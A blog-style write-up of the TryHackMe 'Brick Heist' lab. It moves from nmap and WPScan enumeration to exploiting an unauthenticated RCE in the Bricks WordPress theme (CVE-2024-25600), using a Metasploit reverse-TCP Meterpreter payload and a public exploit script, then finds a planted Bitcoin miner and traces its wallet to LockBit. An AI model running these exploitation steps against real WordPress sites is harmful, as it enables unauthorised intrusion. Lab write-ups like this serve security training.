---
title: TryHackMe - Brick Heist
date: 2025-04-14 17:21:00 -5000
categories: [CTF]
tags: [ctf]     # TAG names should always be lowercase
---

# Summary
**Brick Heist** by TryHackMe is an easy-rated machine that starts with exploiting a remote code execution (RCE) vulnerability in an outdated WordPress theme. After gaining access, the remaining flags require basic Linux enumeration skills, such as locating services and analyzing log files. The machine concludes with a challenge to find a cryptocurrency wallet address, decode it, and identify the threat group associated with its activity.

<br/>

> **Note:** Add `10.10.134.145 bricks.thm` to your **/etc/hosts** file.
{: .prompt-info }

<br/>

# Nmap

```jsx
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV bricks.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 15:40 EDT
Nmap scan report for bricks.thm (10.10.134.145)
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:93:a9:4c:30:5a:2c:76:58:3c:63:30:ff:75:b8:0f (RSA)
|   256 f1:cf:e3:6c:5d:ff:81:88:30:df:19:f9:e9:57:11:06 (ECDSA)
|_  256 ea:3a:e7:92:e5:de:13:7e:3d:9c:2c:13:16:0e:c9:12 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
| tls-alpn: 
|   h2
|_  http/1.1
|_http-generator: WordPress 6.5
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Brick by Brick
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.52 seconds

```

<br/>

# Port 80
We are unable to request port 80 with a `GET` request.

![](/assets/thm/brick-heist/0.png)
*Website Landing Page*

<br/>

# Port 443

![](/assets/thm/brick-heist/1.png)
*Fingerprinting*

<br/>

The `favicon` reveals that this site is a `wordpress` site. Looking at the source code there is `wp-content` which confirms that this is `wordpress`.

<br/>

**FUZZing**

```jsx
┌──(kali㉿kali)-[~]
└─$ ffuf -u https://bricks.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bricks.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 383ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 881ms]
                        [Status: 200, Size: 6988, Words: 222, Lines: 56, Duration: 970ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 956ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 965ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 983ms]
b                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 835ms]
s                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 850ms]
wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 120ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 761ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4475ms]
wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 149ms]
br                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3173ms]
S                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 951ms]
B                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 7274ms]
sa                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3594ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3718ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 7048ms]
sample                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2522ms]
'                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2160ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5160ms]
 
```

**WPScan**

```jsx
┌──(kali㉿kali)-[~]
└─$ wpscan --url https://bricks.thm --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.10.134.145]
[+] Started: Sun Apr 13 16:19:19 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: WP < 6.5.2 - Unauthenticated Stored XSS
 |     Fixed in: 6.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
 |      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Bricks < 1.9.6.1 - Unauthenticated Remote Code Execution
 |     Fixed in: 1.9.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/8bab5266-7154-4b65-b5bc-07a91b28be42
 |      - https://twitter.com/calvinalkan/status/1757441538164994099
 |      - https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6
 |
 | [!] Title: Bricks < 1.9.6.1 - Unauthenticated Remote Code Execution
 |     Fixed in: 1.9.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25600
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b97b1c86-22a4-462b-9140-55139cf02c7a
 |
 | [!] Title: Bricks < 1.10.2 - Authenticated (Bricks Page Builder Access+) Stored Cross-Site Scripting
 |     Fixed in: 1.10.2
 |     References:
 |      - https://wpscan.com/vulnerability/e241363a-2425-436d-a1b2-8c513047d6ce
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3410
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ba5e93a2-8f42-4747-86fa-297ba709be8f
 |
 | [!] Title: Bricksbuilder < 1.9.7 - Authenticated (Contributor+) Privilege Escalation via create_autosave
 |     Fixed in: 1.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/d4a8b4de-a687-4e55-ab71-2784bef3fc55
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2297
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/cb075e85-75fc-4008-8270-4d1064ace29e
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Sun Apr 13 16:19:32 2025
[+] Requests Done: 143
[+] Cached Requests: 38
[+] Data Sent: 35.385 KB
[+] Data Received: 61.069 KB
[+] Memory used: 257.367 MB
[+] Elapsed time: 00:00:12

```

<br/>

> Title: Bricks < 1.9.6.1 - [Unauthenticated Remote Code Execution](https://www.rapid7.com/db/modules/exploit/multi/http/wp_bricks_builder_rce/)
{: .prompt-danger }


```jsx
msf6 > use exploit/multi/http/wp_bricks_builder_rce 
msf6 exploit(multi/http/wp_bricks_builder_rce) > show options

Module options (exploit/multi/http/wp_bricks_builder_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_bricks_builder_rce) > set RHOST bricks.thm
RHOST => bricks.thm
msf6 exploit(multi/http/wp_bricks_builder_rce) > set RPORT 443
msf6 exploit(multi/http/wp_bricks_builder_rce) > set LHOST 10.8.103.236
LHOST => 10.8.103.236
msf6 exploit(multi/http/wp_bricks_builder_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(multi/http/wp_bricks_builder_rce) > exploit
[*] Started reverse TCP handler on 10.8.103.236:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5
[+] Detected Bricks Builder theme version: 1.9.5
[+] The target appears to be vulnerable.
[+] Nonce retrieved: 40f495b6e4
[*] Sending stage (40004 bytes) to 10.10.134.145
[*] Meterpreter session 1 opened (10.8.103.236:4444 -> 10.10.134.145:40816) at 2025-04-13 16:33:04 -0400

meterpreter > 

```

```jsx
meterpreter > ls
Listing: /data/www/default
==========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  523    fil   2024-04-02 07:13:36 -0400  .htaccess
100644/rw-r--r--  43     fil   2024-04-05 08:39:01 -0400  650c844110baced87e1606453b93f22a.txt
100644/rw-r--r--  405    fil   2024-04-02 07:12:03 -0400  index.php
040755/rwxr-xr-x  4096   dir   2023-04-11 20:53:55 -0400  kod
100644/rw-r--r--  19915  fil   2024-04-04 11:15:40 -0400  license.txt
040755/rwxr-xr-x  4096   dir   2024-04-02 07:03:35 -0400  phpmyadmin
100644/rw-r--r--  7401   fil   2024-04-04 11:15:40 -0400  readme.html
100644/rw-r--r--  7387   fil   2024-04-04 11:15:40 -0400  wp-activate.php
040755/rwxr-xr-x  4096   dir   2024-04-02 07:12:03 -0400  wp-admin
100644/rw-r--r--  351    fil   2024-04-02 07:12:03 -0400  wp-blog-header.php
100644/rw-r--r--  2323   fil   2024-04-02 07:12:03 -0400  wp-comments-post.php
100644/rw-r--r--  3012   fil   2024-04-04 11:15:40 -0400  wp-config-sample.php
100666/rw-rw-rw-  3288   fil   2024-04-02 07:12:39 -0400  wp-config.php
040755/rwxr-xr-x  4096   dir   2025-04-13 15:42:28 -0400  wp-content
100644/rw-r--r--  5638   fil   2024-04-02 07:12:03 -0400  wp-cron.php
040755/rwxr-xr-x  16384  dir   2024-04-04 11:15:40 -0400  wp-includes
100644/rw-r--r--  2502   fil   2024-04-02 07:12:03 -0400  wp-links-opml.php
100644/rw-r--r--  3927   fil   2024-04-02 07:12:03 -0400  wp-load.php
100644/rw-r--r--  50917  fil   2024-04-04 11:15:40 -0400  wp-login.php
100644/rw-r--r--  8525   fil   2024-04-02 07:12:03 -0400  wp-mail.php
100644/rw-r--r--  28427  fil   2024-04-04 11:15:40 -0400  wp-settings.php
100644/rw-r--r--  34385  fil   2024-04-02 07:12:03 -0400  wp-signup.php
100644/rw-r--r--  4885   fil   2024-04-02 07:12:03 -0400  wp-trackback.php
100644/rw-r--r--  3246   fil   2024-04-04 11:15:40 -0400  xmlrpc.php

```

<br/>

# Flag 1 - What is the content of the hidden .txt file in the web folder?

```jsx
meterpreter > cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

<br/>

# Exploit Issues

I’m unable to drop down to a shell and don’t seem to have permissions to do much, so I’m going to need to escalate my privileges.

```jsx
meterpreter > getuid
Server username: apache
```

<br/>

Copied `linpeas.sh` to machine but sessions dies whenever I try to get a shell.

<br/>

```jsx
meterpreter > upload linpeas.sh
[*] Uploading  : /home/kali/Desktop/Scripts/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 820.40 KiB (0.0%): /home/kali/Desktop/Scripts/linpeas.sh -> linpeas.sh
[*] Completed  : /home/kali/Desktop/Scripts/linpeas.sh -> linpeas.sh

meterpreter > execute -f linpeas.sh
[*] 10.10.134.145 - Meterpreter session 5 closed.  Reason: Died

```

<br/>

Meterpreter shell keeps crashing.

```jsx
meterpreter > shell

[*] 10.10.134.145 - Meterpreter session 6 closed.  Reason: Died
[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>
msf6 exploit(multi/http/wp_bricks_builder_rce) > exit

```

<br/>

I decided to try a different [exploit](https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/refs/heads/main/CVE-2024-25600.py) at this point

```jsx
┌──(venv)─(kali㉿kali)-[~/Desktop/Scripts/Exploits]
└─$ python3 CVE-2024-25600.py -u https://bricks.thm 
/home/kali/Desktop/Scripts/Exploits/CVE-2024-25600.py:18: SyntaxWarning: invalid escape sequence '\ '
  color.print("""[yellow]

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> ls

```

<br/>

# Flag 2 - What is the name of the suspicious process?

Looking through `systemctl` show a suspicious process.

```jsx
  systemd-timesyncd.service                        loaded active     running   Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running   TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running   Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running   Unattended Upgrades Shutdown     
```

<br/>

Lets get the process name from the service.

```jsx
Shell> systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target

```

<br/>

**Flag 2**

```jsx
nm-inet-dialog
```

<br/>

# Flag 3 - What is the service name affiliated with the suspicious process?

```jsx
ubuntu.service
```

<br/>

# Flag 4 - What is the log file name of the miner instance?

I first searched for the logs in `/var/log` but there was no logs from this process. I then checked to see if the logs are being stored at the same directory of the binary.

```jsx
Shell> ls /lib/NetworkManager/
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections
```

```jsx
Shell> cat /lib/NetworkManager/inet.conf
2024-04-11 10:53:54,546 [*] Miner()
2024-04-11 10:53:56,559 [*] Miner()
2024-04-11 10:53:58,574 [*] Miner()
2024-04-11 10:54:00,576 [*] Miner()
2024-04-11 10:54:02,579 [*] Miner()
```

<br/>

**Flag 4**

```jsx
inet.conf
```

<br/>

# Flag 5 - What is the wallet address of the miner instance?

I tried searching through all the configuration files and log files and didn’t find anything. I don’t know much about the crypto world, but the crypto address I assume is not sent over http. From here I decided that the address must be in the binary somewhere.

```jsx
meterpreter > download /lib/NetworkManager/nm-inet-dialog
[*] Downloading: /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 1.00 MiB of 6.63 MiB (15.09%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 2.00 MiB of 6.63 MiB (30.18%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 3.00 MiB of 6.63 MiB (45.27%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 4.00 MiB of 6.63 MiB (60.36%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 5.00 MiB of 6.63 MiB (75.45%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 6.00 MiB of 6.63 MiB (90.54%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Downloaded 6.63 MiB of 6.63 MiB (100.0%): /lib/NetworkManager/nm-inet-dialog -> /home/kali/Desktop/Scripts/Exploits/nm-inet-dialog
[*] Completed  : 
```

```jsx
┌──(venv)─(kali㉿kali)-[~/Desktop/Scripts/Exploits]
└─$ file nm-inet-dialog                     
nm-inet-dialog: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4900f1057c817d78f6abf8c33793107b79dcd1a7, for GNU/Linux 2.6.32, stripped
```

<br/>

I tried for a quick win with `strings` but didn’t find anything. After this I had some issues setting up IDA and decided I must have missed something on the machine. After all, the machine is rated easy.

Printing out the same file as before I thought that this long sting might be a crypto wallet address.

```jsx
Shell> head /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()

```

The string was too long to be a crypto address so I put it in `cyberchef` to decode it.

![](/assets/thm/brick-heist/2.png)

I had tried this as the flag but it was too long. I really need to read up on crypto…

```jsx
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

Asking ChatGPT I got the following response:

![](/assets/thm/brick-heist/3.png)

<br/>

**Flag 5**

```jsx
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

<br/>

# Flag 6 - The wallet address used has been involved in transactions between wallets belonging to which threat group?

Going to this [website](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa) and checking old transactions.

![](/assets/thm/brick-heist/4.png)

Search this bitcoin wallet address lead me to an [article](https://ofac.treasury.gov/recent-actions/20240220) from the US Treasury

```jsx
bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r
```

![](/assets/thm/brick-heist/5.png)

<br/>

**Flag 6**

```jsx
lockbit
```
